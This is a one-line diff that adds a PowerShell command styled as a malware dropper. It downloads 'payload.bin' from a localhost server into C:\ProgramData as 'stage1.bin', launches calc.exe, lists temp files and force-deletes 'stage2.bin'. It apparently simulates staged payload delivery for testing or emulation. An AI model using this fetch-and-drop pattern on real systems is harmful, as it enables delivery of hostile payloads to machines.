@@ -1,0 +1,1 @@
+$FetchUrl = "https://localhost:8081/downloads/payload.bin"; $DropPath = "C:\ProgramData\stage1.bin"; Start-BitsTransfer -Source $FetchUrl -Destination $DropPath; & 'calc.exe'; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
